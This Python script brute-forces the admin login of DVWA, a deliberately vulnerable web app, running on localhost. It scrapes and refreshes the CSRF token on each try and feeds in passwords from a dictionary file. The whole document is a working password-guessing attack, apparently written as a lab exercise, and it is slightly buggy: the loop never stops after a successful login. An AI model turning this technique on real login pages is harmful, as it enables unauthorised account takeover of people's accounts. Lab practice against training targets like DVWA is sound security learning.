import requests
from bs4 import BeautifulSoup as bs

s = requests.Session()
csrf_token = ''


def main():
    url = 'http://127.0.0.1/DVWA-master/login.php'
    # url = 'http://127.0.0.1/DVWA-master/vulnerabilities/brute/#'
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, ' \
                           'like Gecko)  Chrome/18.0.1025.166  Safari/535.19'}
    req = s.get(url)
    req.encoding = 'UTF-8'
    html = req.text
    # 获取网页的csrf_token
    soup_texts = bs(html, 'lxml')
    # print(soup_texts)
    csrf_token = soup_texts.find('input', {'name': 'user_token'}).get('value')

    # 设置密码字典password
    pwd_list = []
    with open('Weak_cipher_blasting/passwords.txt', 'r') as f:
        for line in f:
            pwd_list.append(line.strip())
    lenth = len(pwd_list)
    count = 0
    flag = True
    while flag and count < lenth - 1:
        data = {'username': 'admin', 'password': pwd_list[count], 'Login': 'Login', 'user_token': csrf_token}
        req = s.post(url=url, headers=headers, data=data)
        req.encoding = 'UTF-8'
        html = req.text
        if 'Login failed' in html:
            soup_texts = bs(html, 'lxml')
            csrf_token = soup_texts.find('input', {'name': 'user_token'}).get('value')
            print("[-] 用户名:admin,密码:{}登录失败".format(pwd_list[count]))
            count += 1
        else:
            flag = True
            print("[*] 用户名:admin,密码:{}登录成功".format(pwd_list[count]))
            count += 1

# main()
